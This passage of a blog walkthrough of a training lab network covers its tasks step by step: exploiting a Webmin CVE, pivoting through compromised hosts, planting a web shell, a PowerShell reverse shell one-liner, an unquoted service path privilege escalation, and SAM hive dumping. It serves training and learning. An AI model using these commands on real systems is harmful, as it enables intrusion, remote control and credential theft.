<a class=heading-link href=#task-5---webserver-enumeration><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This is the first task that is more hands on. There are several questions for this particular task, which are as follows:</p><p><img src=/assets/img/Wreath2.png alt="Wreath Task 5 questions"></p><p>Let&rsquo;s start with the first one to identify how many ports of the first 15,000 are open. As stated in the beginning of this step, you will scan the initial IP listed on the Network screen, which should look similar to this:</p><p><img src=/assets/img/Wreath3.png alt="Wreath Network Initial Host"></p><p>Let&rsquo;s run the following command to enumerate the first 15,000 TCP ports:</p><p><code>nmap -A -oA wreath-network -p1-15000 &lt;web server IP></code></p><p><img src=/assets/img/Wreath4.png alt="Wreath nmap"></p><p>It appears that SSH(port 22), HTTP(port 80), HTTPS(port 443), and HTTP (10000) are open. This means the answer to the first question for this task is:</p><p><code>4</code></p><p>The 2nd question asks what operating system nmap thinks is running. By looking at the Apache server that is running on ports 80 and 443, it appears to be:</p><p><code>centos</code></p><p>Next, attempt to navigate to the http website with:</p><p><code>http://&lt;initial server IP></code></p><p><img src=/assets/img/Wreath5.png alt="Wreath http site"></p><p>You should be redirected to a domain, which is the answer to this question:</p><p><code>https://thomaswreath.thm</code></p><p>The next question requires you to edit your hosts file. In Linux, this is located at <code>/etc/hosts</code>. To edit this, run the following:</p><p><code>nano /etc/hosts</code></p><p>And add the following entry:</p><p><code>&lt;initial ip address> thomaswreath.thm</code></p><p><img src=/assets/img/Wreath6.png alt="Wreath nano /etc/hosts"></p><p>Press <strong>CTRL+S</strong> followed by <strong>CTRL+X</strong> to save changes and close nano. This question can now be completed and you should be able to view the website properly.</p><p>The next question wants you to review the website and find Thomas&rsquo;s mobile phone number, which is located during the bottom of the page:</p><p><img src=/assets/img/Wreath7.png alt="Wreath website mobile phone number"></p><p><code>+447821548812</code></p><p>The next question wants you to take a look at the high level port, which is 10000 and uncover the name and version of the application that is running on this port. Reviewing the nmap results above provides you with the following:</p><p><img src=/assets/img/Wreath8.png alt="Wreath nmap port 10000"></p><p><code>MiniServ 1.890 (Webmin httpd)</code></p><p>Next, it wants to know the CVE for this version of this application. A Google search of:</p><p><code>MiniServ 1.890 CVE</code></p><p>returns the following, which answers this question:</p><p><img src=/assets/img/Wreath9.png alt="Wreath MiniServ CVE"></p><p><code>CVE-2019-15107</code></p><p>The final question just lets you know you&rsquo;ve found everything you need for this task, so you can complete it and move on to Task 6!</p><h3 id=task-6---webserver-exploitation>Task 6 - [Webserver] Exploitation
<a class=heading-link href=#task-6---webserver-exploitation><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task walks you through downloading an exploit for this application and how to exploit it. The following questions are asked as part of this task:</p><p><img src=/assets/img/Wreath10.png alt="Wreath Task 6 Questions"></p><p>The first task wants you to run the exploit found <a href=https://github.com/MuirlandOracle/CVE-2019-15107>here</a>. After downloading this file, follow the steps listed to ensure that the requirements are installed and that the file is made executable in order to run this exploit. Once this has been completed, run the exploit with:</p><p><code>python3 CVE-2018-15107.py 10.200.84.200</code></p><p><img src=/assets/img/Wreath11.png alt="Wreath Webmin Exploit"></p><p>The next question asks you who webmin is running as. This is a pretty easy question, and can be solved by running:</p><p><code>whoami</code></p><p>which returns the result of:</p><p><code>root</code></p><p><img src=/assets/img/Wreath12.png alt="Wreath Webmin root shell"></p><p>Next, let&rsquo;s get a reverse shell back to our attacker system. First, from your attacker box, you need to find out your tun0 IP, which can be done with:</p><p><code>ip a</code></p><p><img src=/assets/img/Wreath13.png alt="Wreath Attacker IP"></p><p>Now, from the attacker IP, we need to use netcat to catch the reverse shell. Let&rsquo;s do that over port 25 using the following command:</p><p><code>nc -nvlp 25</code></p><p>Back on the Webmin exploit terminal window, run:</p><p><code>shell</code></p><p>and then enter your IP address for the next prompt followed by the port you used.</p><p><img src=/assets/img/Wreath14.png alt="Wreath Webmin reverse shell"></p><p>Next, back on the terminal window where you used netcat, you should have a root shell which completes this question. Next, let&rsquo;s stabilize the reverse shell by running:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span style=display:flex><span>export TERM=xterm
</span></span></code></pre></div><p>Next, press:</p><p><code>CTRL+Z</code></p><p>to background the reverse shell, and then run:</p><p><code>stty raw -echo; fg</code></p><p>To bring it back to the foreground. This will turn off the echo of commands you run.</p><p><img src=/assets/img/Wreath15.png alt="Wreath reverse shell TTY config"></p><p>This will complete the stabilization question. The next question wants you to find the root user&rsquo;s hash. This can be found by running:</p><p><code>cat /etc/shadow</code></p><p><img src=/assets/img/Wreath16.png alt="Wreath shadow file"></p><p>This provides the answer to this question. Typically, you would attempt to crack this hash, but you are told this is not an easily crackable password. Let&rsquo;s see if we can find another way to establish persistence. After some review, SSH is setup for the root user, and you can find the root user private key at:</p><p><code>/root/.ssh/id_rsa</code></p><p>This is the answer to this question. Save this file to your attacker machine and run:</p><p><code>chmod 600 &lt;key name></code></p><p>in order to use it later.</p><p>The last question for this task has you acknowledge that you have completed the above, so you can quickly close this out to move to Task 7.</p><h3 id=task-7-pivoting-what-is-pivoting>Task 7 [Pivoting] What is Pivoting?
<a class=heading-link href=#task-7-pivoting-what-is-pivoting><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task gives you a brief summary of what pivoting is. The only task here is to acknowledge that you&rsquo;ve read the summary. Go ahead and complete this question to move on to Task 8.</p><h3 id=task-8-pivoting-high-level-overview>Task 8 [Pivoting] High-level Overview
<a class=heading-link href=#task-8-pivoting-high-level-overview><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This goes a bit more in depth on the topic from the previous task, and has two questions to answer.</p><p><img src=/assets/img/Wreath17.png alt="Wreath Task 8 Questions"></p><p>The first question asks you which pivoting method can send information inside another protocol. The answer to this is:</p><p><code>tunnelling</code></p><p>The 2nd question, while not needed for this challenge, asks you to find the Meterpreter module for port forwarding. The answer to this question is:</p><p><code>portfwd</code></p><h3 id=task-9-pivoting-enumeration>Task 9 [Pivoting] Enumeration
<a class=heading-link href=#task-9-pivoting-enumeration><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task goes over some commands that can be ran to find useful information on target systems once you&rsquo;ve established a foothold. In particular, it provides information on how to find DNS entries on Windows and Linux systems. There is also information on how to do a ping sweep from Linux to hosts in a particular /24 network. This information provides answers to the questions below:</p><p><img src=/assets/img/Wreath18.png alt="Wreath Task 9 Questions"></p><p>The first question asks for the path/file for DNS entries in Linux, which is:</p><p><code>/etc/resolv.conf</code></p><p>The second question asks for the path/file for DNS entries in Windows, which is:</p><p><code>c:\Windows\System32\drivers\etc\hosts</code></p><p>The third question asks on how to perform a manual ping sweep with bash on a 172.160.0.x/24 network, which would be:</p><p><code>for i in {1..255} do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done</code></p><p>This completes the questions for Task 9. Let&rsquo;s move on to Task 10.</p><h3 id=task-10-pivoting-proxychains--foxyproxy>Task 10 [Pivoting] Proxychains & FoxyProxy
<a class=heading-link href=#task-10-pivoting-proxychains--foxyproxy><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task walks you through configuring Proxychains and FoxyProxy, which leads to the following questions:</p><p><img src=/assets/img/Wreath19.png alt="Wreath Task 10 Questions"></p><p>The first question asks how you would update the proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242. The answer to this question is:</p><p><code>socks4 127.0.0.1 4242</code></p><p>The second question asks you how you would use proxychains to telnet through a proxy to 172.16.0.100:23. The answer to this question is:</p><p><code>proxychains telnet 172.16.0.100 23</code></p><p>The third question lets you know you&rsquo;ve discovered a web app running on a target on an isolated network, and wants to know what would be better for proxying, Proxychains (PC) or FoxyProxy (FP). In this case, it would be:</p><p><code>FP</code></p><h3 id=task-11-pivoting-ssh-tunneling--port-forwarding>Task 11 [Pivoting] SSH Tunneling / Port Forwarding
<a class=heading-link href=#task-11-pivoting-ssh-tunneling--port-forwarding><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task walks you through how to setup local and remote port forwarding using SSH between two systems. After reading the information provided, several questions are asked for this particular task as shown below:</p><p><img src=/assets/img/Wreath20.png alt="Wreath Task 11 Questions"></p><p>The first question asks if you&rsquo;re connecting to an SSH server from your attacking machine to create a port forward, whether this is a local or remote port forward. The answer to this is local (L) as you&rsquo;re initiating the connection from the attacker machine:</p><p><code>L</code></p><p>The second question asks which switch combination can be used to background an SSH port forward or tunnel. The answer to this is:</p><p><code>-fN</code></p><p>Which tells ssh to background the shell immediately and to not execute commands (instead, just keep the SSH connection open in the background).</p><p>The third question asks whether it&rsquo;s a good idea to enter our own password on a remote machine to setup a reverse proxy. The answer to this is:</p><p><code>Nay</code></p><p>The fourth question asks how you would create a throwaway pair of SSH keys for a reverse connection. The command to use would be:</p><p><code>ssh-keygen</code></p><p>The fifth question starts to put the previous questions together, and asks you the command to setup a reverse port forward from a remote machine to your local machine. The answer based on the information provided would be:</p><p><code>ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN</code></p><p>The sixth question asks you to setup a forward proxy on port 8000 to <a href=mailto:user@target.thm>user@target.thm</a> and then background the shell. This is done with:</p><p><code>ssh -L 8000 user@target.thm -fN</code></p><p>The final question asks how you would port forward a web server (port 80) that&rsquo;s only accessible to itself to your attacking machine over port 8000. This would be accomplished with:</p><p><code>ssh -R 8000:127.0.0.1:80 user@172.16.0.50 -fN</code></p><p>This completes Task 11, let&rsquo;s move on to the next Task.</p><h3 id=task-12-pivoting-plinkexe>Task 12 [Pivoting] plink.exe
<a class=heading-link href=#task-12-pivoting-plinkexe><i class="fa fa-link" aria-hidden=true></i></a></h3><p>plink.exe is a windows command line version of PuTTY, which can be used to establish a reverse connection to an attacker box with:</p><p><code>cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N</code></p><p>There is only one question for this task as shown below:</p><p><img src=/assets/img/Wreath21.png alt="Wreath Task 12 Questions"></p><p>The answer to this question is:</p><p><code>puttygen</code></p><h3 id=task-13-pivoting-socat>Task 13 [Pivoting] Socat
<a class=heading-link href=#task-13-pivoting-socat><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task goes over what socat is and how it can be used to create fully stable shells. Near the bottom of this task are four questions, which are as follows:</p><p><img src=/assets/img/Wreath22.png alt="Wreath Task 13 Questions"></p><p>The first qusetion asks which socat option lets you reuse the same listening port for more than one connection. That answer is:</p><p><code>reuseaddr</code></p><p>The next question asks how you would use a static socat binary to relay a reverse shell to port 443 on your attacking machine with an IP address of 172.16.0.200. The server listener would be TCP port 8000. This would be accomplished with:</p><p><code>./socat tcp-l:8000 tcp:172.16.0.200:443</code></p><p>The third question asks how you would perform port forwarding using the easy method with socat. In this example, it would be done with:</p><p><code>./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &</code></p><p>The final question asks how you would creat an encrypted port forward using OpenSSL. This would require several steps as shown below. First, create the certificate with:</p><p><code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</code></p><p>Next, combine the .key and .crt files into a .pem file with:</p><p><code>cat shell.key shell.crt > shell.pem</code></p><p>Next, open up the reverse shell listener with:</p><p><code>socat OPENSSL-LISTEN:&lt;PORT>,cert=shell.pem,verify=0 -</code></p><p>Finally, to connect to the reverse shell, use:</p><p><code>socat OPENSSL:&lt;LOCAL-IP>:&lt;LOCAL-PORT>,verify=0 EXEC:/bin/bash</code></p><h3 id=task-14-pivoting-chisel>Task 14 [Pivoting] Chisel
<a class=heading-link href=#task-14-pivoting-chisel><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task provides several ways to create reverse connections with chisel. There are four questions for this task.</p><p><img src=/assets/img/Wreath23.png alt="Wreath Task 14 Questions"></p><p>The first question asks how you would start a chisel server for a reverse connection using port 4242. This would be accomplished with:</p><p><code>./chisel server -p 4242 --reverse</code></p><p>The second questions wants to know the command to use to connect to this server from a compromised host with a SOCKS proxy, assuming your IP is 172.16.0.200. This would be (we assume port 4242 based on the question above):</p><p><code>./chisel client 172.16.0.200:4242 R:socks &</code></p><p>The third question asks how to forward 172.16.0.100:3306 to your attacker machine 172.16.0.200 on port 33060 on port 33060 while listening on port 1337 and backgrounding the process. This would be done with the following format:</p><p><code>./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &</code></p><p>Which results in the following answer:</p><p><code>./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &</code></p><p>The fourth question for this task asks how to create a local port forward opening port 8000 locally and linking to 172.16.0.10:80 when you have a chisel server running on 172.16.0.5 on port 4444. This would be accomplished with:</p><p><code>./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT</code></p><p>Which would result in the following answer:</p><p><code>./chisel client 172.16.0.5:4444 8000:172.16.0.10:80</code></p><h3 id=task-15-pivoting-sshuttle>Task 15 [Pivoting] sshuttle
<a class=heading-link href=#task-15-pivoting-sshuttle><i class="fa fa-link" aria-hidden=true></i></a></h3><p>sshuttle is yet another tool that can be used to create an SSH connection that acts as a tunnelled proxy. It essentially simulates a VPN. This task has three questions to answer as shown below:</p><p><img src=/assets/img/Wreath24.png alt="Wreath Task 15 Questions"></p><p>The first qustion asks how you would use sshuttle to connect to 172.16.20.7 with a username of pwned and a subnet of 172.16.0.0/16. This would be accomplished with:</p><p><code>sshuttle -r pwned@172.16.20.7 172.16.0.0/16</code></p><p>The second question asks what switch/argument you would use to tell sshuttle to use a keyfile called priv_key located in the current directory. This would be:</p><p><code>--ssh-cmd "ssh -i priv_key"</code></p><p>The final command asks what switch and argument you would use if you are receiving a Broken Pipe error when attempting to connect to 172.16.0.100.

<a class=heading-link href=#task-17-git-server-enumeration><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task is where the previous tasks are actually put into practice. There are six questions associated with this task, which are as follows:</p><p><img src=/assets/img/Wreath25.png alt="Wreath Task 17 Questions"></p><p>For the first question, we are requested to discover how many hosts are active on the network. To do so, we should first connect to the initial server we ended up with the root ssh key for in Task 6, and use that to connect. As a refresher, this would be done with:</p><p><code>ssh -i id_rsa root@10.200.84.200</code></p><p>Next, let&rsquo;s setup a python server to copy over the nmap static binary to this system. In another terminal tab, navigate to a directory on your attacker system where you have this binary stored, and run the following:</p><p><code>python3 -m http.server</code></p><p>Back on the target machine where you connected as root, run the following commands to navigate to the /tmp directory and copy the nmap binary over (which has had my username added to it per the directions in the course).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>cd /tmp

</span></span></code></pre></div><p><img src=/assets/img/Wreath26.png alt="Wreath copy nmap binary"></p><p>Next, let&rsquo;s run nmap on this network with:</p><p><code>./nmap-&lt;username> -sn 10.200.84.0/24</code></p><p>This provides the following results.</p><p><img src=/assets/img/Wreath27.png alt="Wreath copy nmap ping sweep"></p><p>We would exclude the .1 and .250 IP addresses per the instructions from this challenge, along with the .200 host we&rsquo;re connected to, so the answer to the first question would be:</p><p><code>2</code></p><p>The second question asks for the last octet of the other two hosts, which can be found in the scan that was just performed. The answer to this is:</p><p><code>100,150</code></p><p>The third question asks you to perform a scan on the hosts discovered during the prior two qusetions. Let&rsquo;s run the following nmap scan on these two hosts:</p><p><code>./nmap-&lt;username> 10.200.84.100,150 -p-</code></p><p>This returns the following results:</p><p><img src=/assets/img/Wreath28.png alt="Wreath nmap host scan"></p><p>This lets us know that all the ports scanned that were <strong>not</strong> filtered were on the following host, which is the answer to this question:</p><p><code>150</code></p><p>The fourth question asks for the 3 ports uncovered on the other host in ascending order, which are as follows:</p><p><code>80,3389,5985</code></p><p>The fifth question asks you to assume that the services listed are correct, and guess which one will likely have some sort of vulnerability. Based on the services listed, the following is most likely the service with a vulnerability:</p><p><code>http</code></p><p>The sixth question requires no answer, and just wants you to know that once you have the above information, you can use some of the previously discussed tools/techniques to attempt to access them.</p><h3 id=task-18-git-server-pivoting>Task 18 [Git Server] Pivoting
<a class=heading-link href=#task-18-git-server-pivoting><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task requires you to port forward the web server on the .150 host so you can visit it from your attacker machine. Per the instructions, sshuttle is the recommended approach. There are four questions for this task as shown below:</p><p><img src=/assets/img/Wreath29.png alt="Wreath Task 18 Questions"></p><p>Since we have the id_rsa key for the root user of the .200 host, let&rsquo;s start by running the following from our attacker machine to connect:</p><p><code>sshuttle -r root@10.200.84.200 --ssh-cmd "ssh -i id_rsa" 10.200.84.0/24 -x 10.200.84.200</code></p><p><img src=/assets/img/Wreath30.png alt="Wreath sshuttle connection Git Server"></p><p>Next, visit <a href=http://10.x.x>http://10.x.x</a>.150 (x.x will vary based on which network you are on) from your attacker machine, you should see an error page similar to the following:</p><p><img src=/assets/img/Wreath31.png alt="Wreath sshuttle Django error"></p><p>This error message lets you know the answer to the first question asking what service is running by reviewing the error message, which is:</p><p><code>gitstack</code></p><p>Let&rsquo;s navigate to <a href=http://10.x.x>http://10.x.x</a>.150/gitstack, and you are provided with default credentials.</p><p><img src=/assets/img/Wreath32.png alt="Wreath gitstack login page"></p><p>Test these out to answer the second question. The answer is:</p><p><code>Nay</code></p><p>since these do not work. For the third question, you just need to acknowledge that you&rsquo;ve ran:</p><p><code>searchsploit gitstack</code></p><p>as that information is used to answer the forth question for this task.</p><p>After running searchsploit gitstack, you will see the following.</p><p><img src=/assets/img/Wreath33.png alt="Wreath searchsploit exploit list"></p><p>The EDB number is the number listed before .py in the Path variable. In this case, this is:</p><p><code>43777</code></p><h3 id=task-19-git-server-code-review>Task 19 [Git Server] Code Review
<a class=heading-link href=#task-19-git-server-code-review><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task consists of 4 questions, as shown below:</p><p><img src=/assets/img/Wreath34.png alt="Wreath Task 19 Questions pt 1">
<img src=/assets/img/Wreath35.png alt="Wreath Task 19 Questions pt 2"></p><p>As written in the provided directions, let&rsquo;s copy this exploit into our current folder on our attacker machine with:</p><p><code>searchsploit -m 43777</code></p><p>Next, let&rsquo;s open this exploit in a text editor with:</p><p><code>mousepad 43777.py</code></p><p><img src=/assets/img/Wreath36.png alt="Wreath mousepad 43777.py"></p><p>This should allow us to answer the first three questions for this task. The first question asks for the date this was written, which is:</p><p><code>18.01.2018</code></p><p>The second question asks you what language this was written in, Python 2 or 3. Since there are no parentheses around the print commands, that likely indicates this is python2. This lets us answer the 2nd question, which is:</p><p><code>python2</code></p><p>The next questions asks you to add a shebang at the top of this exploit to indicate which programming language to execute it with. This would be done with:</p><p><code>#!/usr/bin/python2</code></p><p>Next, we will need to modify the ip of the script on line 23 (if you inserted the shebang at the top). Replace the 192.168.1.102 IP with the IP of the .150 box.</p><p><img src=/assets/img/Wreath37.png alt="Wreath modify 43777.py"></p><p>Leave the command to run alone on line 26 for now. The last question wants you to provide the name of the cookie in the POST request on line 74, which is:</p><p><code>csrftoken</code></p><p>Save and close the exploit.</p><h3 id=task-20-git-server-exploitation>Task 20 [Git Server] Exploitation

<img src=/assets/img/Wreath41.png alt="Wreath Task 20 Questions pt 4"></p><p>Let&rsquo;s start by testing the exploit we created in Task 19 to see if it works. This can be ran by running.</p><p><img src=/assets/img/Wreath42.png alt="Wreath test exploit"></p><p>As you can see in the screenshot, this worked successfully and lets us know that the web server is running as system. This also lets us know this is a Windows computer.</p><p><code>./43777.py</code></p><p>Now that we know this is working, let&rsquo;s review the code once again. On line 94, we can see the name of the exploit that is being uploaded. Let&rsquo;s update this to exploit-&lt;username.php>:</p><p><img src=/assets/img/Wreath43.png alt="Wreath test exploit"></p><p>Now, let&rsquo;s rerun this test exploit to upload this web shell. This would answer the first question.</p><p>A review of the code lets us know that this is using a POST command with the &ldquo;a&rdquo; parameter to run our commands. Once we&rsquo;ve ran the exploit, let&rsquo;s reuse the uploaded webshell instead of continuing to run the exploit. This can be done with the following to run any command we would like:</p><p><code>curl -X POST http://&lt;150 machine IP>/web/exploit-&lt;username>.php -d "a=&lt;command to run></code></p><p>Let&rsquo;s test this out with the hostname command, which would be the answer to the second question.</p><p><img src=/assets/img/Wreath44.png alt="Wreath 150 hostname"></p><p>This provides us with the answer of:</p><p><code>git-serv</code></p><p>The third question wants us to figure out the OS on this target. We already know it&rsquo;s windows, but to confirm, run <code>systeminfo</code>.</p><p><img src=/assets/img/Wreath45.png alt="Wreath 150 systeminfo"></p><p>This provides us with the answer to this question:</p><p><code>Windows</code></p><p>The fourth question we had already answered with our test exploit. It is running as the following user:</p><p><code>nt authority\system</code></p><p>The fifth question wants you to try to ping your attacker machine and to see if it was successful or not. This could be done with:</p><p><code>curl -X POST http://&lt;150 machine IP>/web/exploit-&lt;username>.php -d "a=ping -n 3 &lt;attacking machine IP></code></p><p><img src=/assets/img/Wreath46.png alt="Wreath 150 ping"></p><p>It appears that none of the pings made it back, so the answer to this question is:</p><p><code>0</code></p><p>In order to catch the shell, you will need to either setup a shell to be caught on the 200 host, or a relay to relay it back to the attacker machine. Let&rsquo;s try the second option, as that is the entire purpose of this challenge. First, choose a port you would like to use. In this case, we&rsquo;re going to use 8888. We would need to follow the provided instructions and run:</p><p><code>firewall-cmd --zone=public --add-port 8888/tcp</code></p><p>on the .200 machine we initially connected to, as CentOS by default is pretty restrictive with what it allows.</p><p><img src=/assets/img/Wreath47.png alt="Wreath modify 200 firewall"></p><p>Next, let&rsquo;s run a python http server on our attacker machine, like we did earlier, with:</p><p><code>python3 -m http.server</code></p><p>Next, let&rsquo;s navigate to the /tmp folder and download the socat binary to this system so we can set it up as a relay.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>cd /tmp

Let&rsquo;s setup a netcat listener on our attacker machine with:</p><p><code>nc -nvlp 8888</code></p><p>Now that this has been setup, let&rsquo;s use a PowerShell reverse shell along with curl to get a reverse shell to the .150 host on our attacker machine. Let&rsquo;s use the following PowerShell script:</p><p><code>powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('&lt;200 machine ip>',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></p><p>We will need to URL encode this as well, as we will be using curl to establish this connection.

Below are the screenshots for setting up our listener in Starkiller.</p><p>First, click on the <strong>CREATE +</strong> button in the upper right hand corner. In the type drop down, select http. All the options can be left along except for the host IP, which defaults to your eth0 device. This would need to be changed to the tun0 attacker IP. We would also need to select a port that is not in use. In this instance, I selected 9999. Here is a screenshot of what the configuration looks like:</p><p><img src=/assets/img/Wreath64.png alt="Wreath starkiller setup listener"></p><p>Click on <strong>SUBMIT</strong> in the upper right hand corner to create this listener.

To generate it from Starkiller, click on Stagers on the left hand menu (2nd option from the top) and then click on <strong>CREATE +</strong>.</p><p>As the directions state, choose multi/bash as the Type and select the listener you created in the previous task.</p><p><img src=/assets/img/Wreath66.png alt="Wreath starkiller setup stager"></p><p>Once complete, click on <strong>SUBMIT</strong>. Next, click on the 3 dots under Actions and select <strong>Copy to Clipboard</strong></p><p><img src=/assets/img/Wreath67.png alt="Wreath starkiller copy stager"></p><p>Paste the stager into a text editor and save it as:</p><p><code>stager-&lt;username>.sh</code></p><p>This completes the first question. The second question wants you to decode the payload and try to figure out what it&rsquo;s doing. Copy everything in parentheses (besides the single quotes) after the base64.b64decode portion of the script. To answer the second question, run:</p><p><code>echo "&lt;base 64 encoded payload>"|base64 -d</code></p><p>From here, you can see that it&rsquo;s making an HTTP request to your listener.</p><p><img src=/assets/img/Wreath68.png alt="Wreath starkiller decode stager"></p><p>Complete the question and move on to the next task.</p><h3 id=task-27-command-and-control-empire-agents>Task 27 [Command and Control] Empire: Agents

After looking around, the repository was located under:</p><p><code>C:\GitStack\repositories\Website.git</code></p><p>This is the answer to the first question. Next, let&rsquo;s download the entire Website, by running:</p><p><code>download c:\GitStack\repositories\Website.git</code></p><p>This will take a few minutes to complete, but this will finish the second question.</p><p><img src=/assets/img/Wreath97.png alt="Wreath evil-winrm download git website repository"></p><p>The third question wants you to rename the subdirectory in the website.git folder to .git.</p><p>This can be done by running:</p><p><code>mv c:\\GitStack\\repositories\\Website.git .git</code></p><p>Once done, this question is also complete. The fourth question wants you to clone a tool from a Github repository that can be used to extract a git directory. This tool can be clone with:</p><p><code>git clone https://github.com/internetwache/GitTools</code></p><p>Next, run the following command to attempt to extract and recreate the repository into a readable format:</p><p><code>./GitTools/Extractor/extractor.sh .

<img src=/assets/img/Wreath124.png alt="Wreath Task 42 Questions pt 2"></p><p>The first question is fairly simple to get the answer to. Run the provided command (whoami /priv) and you will see the following permissions:</p><p><img src=/assets/img/Wreath125.png alt="Wreath 100 machine whoami /priv"></p><p>The rather infamous privilege to answer the first question is:</p><p><code>SeImpersonatePrivilege</code></p><p>The second question wants you to run <strong>whoami /groups</strong> to see if this user is an Administrator, which answers the second question. Unfortunately they are not.</p><p>For the third question, run:</p><p><code>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"</code></p><p>This will return non default Windows services:</p><p><img src=/assets/img/Wreath126.png alt="Wreath 100 machine wmic list services"></p><p>There is one in particular that stands out, as the path is not in quotes. This is what is referred to as an unquoted service path, which is vulnerable to exploitation. The name of this service is located in the second column, which answers the third question:</p><p><code>SystemExplorerHelpService</code></p><p>The fourth question wants you to find out what this service runs as. Let&rsquo;s run:</p><p><code>sc query SystemExplorerHelpService</code></p><p>This returns the following, which allows you to answer the fourth question:</p><p><img src=/assets/img/Wreath127.png alt="Wreath 100 machine sc qc"></p><p>We have found a service that runs as local system that is vulnerable to attack, however, we need to ensure that the permissions on the directory in the path allow our user proper access to create a file here.

<img src=/assets/img/Wreath133.png alt="Wreath Task 43 Questions pt 3">
<img src=/assets/img/Wreath134.png alt="Wreath Task 43 Questions pt 4"></p><p>For the first question, follow along with the provided instructions to create a wrapper.</p><p><img src=/assets/img/Wreath135.png alt="Wreath wrapper code">
<img src=/assets/img/Wreath136.png alt="Wreath compile wrapper"></p><p>After these steps are done, you can complete the first question. Next, let&rsquo;s start an impacket SMB server on our attacker machine in the directory that the Wrapper.exe file is in with:</p><p><code>sudo /opt/impacket/examples/smbserver.py share . -smb2support -username user -password Password</code></p><p><img src=/assets/img/Wreath137.png alt="Wreath impacket SMB share"></p><p>Next, from the reverse shell on the .100 machine, run the following to connect to this SMB share:</p><p><code>net use \\&lt;attacker ip>\share /USER:user Password</code></p><p><img src=/assets/img/Wreath138.png alt="Wreath net use SMB share"></p><p>Next, let&rsquo;s copy the wrapper over to a folder our current user has access to, with:</p><p><code>copy \\&lt;attacker ip>\share\Wrapper.exe %TEMP%\wrapper-&lt;username>.exe</code></p><p>Next, remove your SMB share from the .100 machine with:</p><p><code>net use \\&lt;attacker ip>\share /del</code></p><p>This completes the second question. Next, create a netcat listener with the port you used in the Wrapper.exe file you created on your attacker machine. Once that is done, run the Wrapper file by running:</p><p><code>"%TEMP\wrapper-&lt;username>.exe"</code></p><p><img src=/assets/img/Wreath139.png alt="Wreath wrapper reverse shell"></p><p>This completes the third question for this task. Let&rsquo;s exit the shell and reset up our listener on that same port on our attacker machine. Next, we discovered the unquoted service path earlier. Let&rsquo;s use this to our advantage and copy the wrapper over to one of the directories so it is executed as local system:</p><p><code>copy %TEMP%\wrapper-&lt;username>.exe "C:\Program Files (x86)\System Explorer\System.exe"</code></p><p>This completes the fourth question.</p><p>Next let&rsquo;s restart the service on the attacker machine with:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>sc stop SystemExplorerHelpService
</span></span><span style=display:flex><span>sc start SystemExplorerHelpService
</span></span></code></pre></div><p><img src=/assets/img/Wreath140.png alt="Wreath 100 machine start/stop service">
<img src=/assets/img/Wreath141.png alt="Wreath 100 machine localsystem reverse shell"></p><p>This completes the fifth question. Next, follow the steps to clean up after yourself and delete the wrapper you created. This completes the sixth question. The final question is optional, and was skipped (and marked complete).</p><h3 id=task-44-exfiltration-exfiltration-techniques--post-exploitation>Task 44 [Exfiltration] Exfiltration Techniques & Post Exploitation
<a class=heading-link href=#task-44-exfiltration-exfiltration-techniques--post-exploitation><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task consists of five questions, which are as follows:</p><p><img src=/assets/img/Wreath142.png alt="Wreath Task 44 Questions pt 1">
<img src=/assets/img/Wreath143.png alt="Wreath Task 44 Questions pt 2"></p><p>Read the provided documentation to answer the first two questions. The answers are as follows:</p><p><code>Nay</code></p><p><code>encryption</code></p><p>For the third question, follow along and let&rsquo;s save the SAM and SYSTEM registry hives by running the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>reg.exe save HKLM\SAM sam.bak
</span></span><span style=display:flex><span>reg.exe save HKLM\SYSTEM system.bak
